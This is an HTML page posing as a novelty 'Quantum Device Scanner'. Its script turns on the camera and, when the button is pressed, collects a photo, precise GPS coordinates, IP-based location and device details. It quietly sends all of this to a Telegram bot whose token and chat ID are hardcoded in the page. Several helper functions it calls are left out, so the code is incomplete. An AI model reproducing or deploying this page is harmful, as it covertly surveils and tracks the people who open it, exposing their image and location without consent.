<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Super AI Quantum Device Scanner</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <style>
    :root {
      --primary: #2ecc71;
      --secondary: #3498db;
      --hologram: rgba(46, 204, 113, 0.2);
    }
    
    body { 
      font-family: 'Courier New', monospace;
      text-align: center; 
      padding: 20px; 
      background: #0a0a0a;
      color: var(--primary);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background-image: 
        radial-gradient(var(--hologram) 1px, transparent 1px),
        radial-gradient(var(--hologram) 1px, transparent 1px);
      background-size: 50px 50px;
      background-position: 0 0, 25px 25px;
    }

    .scanner-box {
      width: 300px;
      height: 300px;
      border: 4px solid var(--primary);
      border-radius: 20px;
      margin: 20px auto;
      position: relative;
      overflow: hidden;
      box-shadow: 0 0 30px rgba(46, 204, 113, 0.3),
                  inset 0 0 20px rgba(46, 204, 113, 0.2);
    }

    .scanner-line {
      position: absolute;
      width: 100%;
      height: 4px;
      background: linear-gradient(90deg, transparent, var(--primary), transparent);
      animation: scan 3s infinite;
      filter: drop-shadow(0 0 5px var(--primary));
    }

    @keyframes scan {
      0% { top: 0; opacity: 0; }
      10% { opacity: 1; }
      90% { opacity: 1; }
      100% { top: 100%; opacity: 0; }
    }

    #device-info {
      background: rgba(0, 0, 0, 0.8);
      padding: 20px;
      border-radius: 10px;
      margin: 20px;
      text-align: left;
      max-width: 90%;
      border: 1px solid var(--primary);
      box-shadow: 0 0 20px rgba(46, 204, 113, 0.2);
      display: none;
    }

    .info-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 10px;
      font-size: 0.9em;
    }

    .info-item {
      padding: 8px;
      background: rgba(46, 204, 113, 0.05);
      border-radius: 5px;
      border: 1px solid rgba(46, 204, 113, 0.1);
    }

    button {
      padding: 15px 40px;
      font-size: 18px;
      background: linear-gradient(45deg, var(--primary), var(--secondary));
      border: none;
      border-radius: 30px;
      cursor: pointer;
      transition: all 0.3s;
      color: black;
      text-transform: uppercase;
      letter-spacing: 2px;
      margin: 20px;
      box-shadow: 0 4px 15px rgba(52, 152, 219, 0.4);
      font-weight: bold;
    }

    #loading {
      display: none;
      font-size: 1.2em;
      color: var(--primary);
      text-shadow: 0 0 10px rgba(46, 204, 113, 0.5);
      margin: 10px;
    }

    .hologram-effect {
      position: fixed;
      width: 200%;
      height: 200%;
      background: 
        linear-gradient(45deg, rgba(0,255,255,0.1) 25%, transparent 25%),
        linear-gradient(-45deg, rgba(255,0,255,0.1) 25%, transparent 25%),
        linear-gradient(45deg, transparent 75%, rgba(0,255,255,0.1) 75%),
        linear-gradient(-45deg, transparent 75%, rgba(255,0,255,0.1) 75%);
      background-size: 20px 20px;
      pointer-events: none;
      mix-blend-mode: overlay;
      opacity: 0.3;
      z-index: 9999;
      animation: hologram 20s linear infinite;
    }

    @keyframes hologram {
      from { transform: translate(-50%, -50%) rotate(0deg); }
      to { transform: translate(-50%, -50%) rotate(360deg); }
    }
  </style>
</head>
<body>
  <h1 style="margin-bottom: 20px; text-shadow: 0 0 15px var(--primary);">üõ∏ QUANTUM DEVICE SCANNER v2.0</h1>
  <div class="scanner-box">
    <div class="scanner-line"></div>
    <video id="video" width="300" height="300" autoplay playsinline muted></video>
  </div>
  <button id="capture-btn">üöÄ INITIATE DEEP SCAN</button>
  <div id="loading">üî≠ CAPTURING QUANTUM SIGNATURE...</div>
  <div id="device-info">
    <h2>‚ö° DEVICE MATRIX PROFILE</h2>
    <div class="info-grid" id="device-info-content"></div>
  </div>

  <script>
    const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
    const CHAT_ID = '1121369247';
    
    let currentStream = null;
    let isScanning = false;
    const video = document.getElementById('video');
    const loading = document.getElementById('loading');

    // Fungsi untuk mendapatkan informasi perangkat lengkap
    async function getDeviceInfo() {
      const info = {
        os: getOS(),
        platform: navigator.platform,
        cores: navigator.hardwareConcurrency || 'Unknown',
        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
        resolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        network: {},
        battery: {},
        ip: {}
      };

      // Informasi Baterai
      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          info.battery = {
            level: `${Math.round(battery.level * 100)}%`,
            charging: battery.charging ? 'Yes' : 'No'
          };
        } catch (e) {
          info.battery = { level: 'Unknown', charging: 'Unknown' };
        }
      }

      // Informasi Jaringan
      if (navigator.connection) {
        const conn = navigator.connection;
        info.network = {
          type: conn.effectiveType,
          downlink: `${conn.downlink} Mbps`,
          rtt: `${conn.rtt} ms`
        };
      }

      // Informasi IP dan Lokasi
      try {
        const ipResponse = await fetch('https://ipapi.co/json/');
        const ipData = await ipResponse.json();
        info.ip = {
          address: ipData.ip,
          city: ipData.city,
          region: ipData.region,
          country: ipData.country_name
        };
      } catch (e) {
        info.ip = { address: 'Unknown' };
      }

      return info;
    }

    // Deteksi OS
    function getOS() {
      const ua = navigator.userAgent;
      if (/android/i.test(ua)) return "Android";
      if (/iPad|iPhone|iPod/.test(ua)) return "iOS";
      if (/Win/.test(ua)) return "Windows";
      if (/Mac/.test(ua)) return "MacOS";
      if (/Linux/.test(ua)) return "Linux";
      return "Unknown";
    }

    // Tampilkan informasi perangkat
    function displayDeviceInfo(info, location) {
      const container = document.getElementById('device-info-content');
      container.innerHTML = `
        <div class="info-item">OS: ${info.os}</div>
        <div class="info-item">Platform: ${info.platform}</div>
        <div class="info-item">CPU Cores: ${info.cores}</div>
        <div class="info-item">RAM: ${info.ram}</div>
        <div class="info-item">Resolution: ${info.resolution}</div>
        <div class="info-item">Battery: ${info.battery.level} (${info.battery.charging})</div>
        <div class="info-item">Network: ${info.network.type || 'N/A'}</div>
        <div class="info-item">IP: ${info.ip.address}</div>
        <div class="info-item">Location: ${info.ip.city}, ${info.ip.country}</div>
        <div class="info-item">GPS: ${location?.coords.latitude.toFixed(6)}, ${location?.coords.longitude.toFixed(6)}</div>
        <div class="info-item">Accuracy: ${Math.round(location?.coords.accuracy)}m</div>
        <div class="info-item">Timezone: ${info.timezone}</div>
      `;
      document.getElementById('device-info').style.display = 'block';
    }

    // Fungsi utama untuk memulai scan
    async function startQuantumScan() {
      if (isScanning) return;
      isScanning = true;
      loading.style.display = 'block';

      try {
        const [photoData, location, deviceInfo] = await Promise.all([
          captureQuantumImage(),
          getPreciseLocation(),
          getDeviceInfo()
        ]);

        const report = generateHologramReport(photoData, location, deviceInfo);
        await sendToTelegram(report);
        displayDeviceInfo(deviceInfo, location);
      } catch (error) {
        alert(`Quantum Error: ${error.message}`);
      } finally {
        isScanning = false;
        loading.style.display = 'none';
      }
    }

    // Fungsi untuk mendapatkan lokasi
    function getPreciseLocation() {
      return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 5000,
          maximumAge: 0
        });
      });
    }

    // Fungsi untuk mengirim ke Telegram
    async function sendToTelegram(report) {
      const formData = new FormData();
      const blob = await dataURItoBlob(report.image);
      
      const caption = `ü™ê *Quantum Scan Complete*\n\n` +
        `üìÖ ${new Date().toLocaleString()}\n\n` +
        `üåç GPS: ${report.metadata.location.coords.latitude.toFixed(6)}, ` +
        `${report.metadata.location.coords.longitude.toFixed(6)}\n` +
        `üéØ Accuracy: ${Math.round(report.metadata.location.coords.accuracy)}m\n\n` +
        `üì± Device: ${report.metadata.deviceInfo.os} | ${report.metadata.deviceInfo.platform}\n` +
        `üß† RAM: ${report.metadata.deviceInfo.ram} | Cores: ${report.metadata.deviceInfo.cores}\n` +
        `üîã Battery: ${report.metadata.deviceInfo.battery.level} (Charging: ${report.metadata.deviceInfo.battery.charging})\n` +
        `üì∂ Network: ${report.metadata.deviceInfo.network.type}\n` +
        `üåê IP: ${report.metadata.deviceInfo.ip.address}\n` +
        `üìç Location: ${report.metadata.deviceInfo.ip.city}, ${report.metadata.deviceInfo.ip.country}`;

      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, `quantum_scan_${Date.now()}.webp`);
      formData.append('caption', caption);
      formData.append('parse_mode', 'Markdown');

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    }

    // Fungsi lainnya tetap sama seperti sebelumnya...
    // (Fungsi captureQuantumImage, applyQuantumFilter, initCamera, dll)

    // Inisialisasi kamera dan event listener
    async function initCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'environment' }
        });
        video.srcObject = stream;
        document.body.appendChild(createHologramEffect());
      } catch (err) {
        alert('Error accessing camera: ' + err.message);
      }
    }

    if (navigator.mediaDevices) {
      initCamera();
      document.getElementById('capture-btn').onclick = startQuantumScan;
    } else {
      alert('Quantum Scanner requires camera access!');
    }
  </script>
</body>
</html>
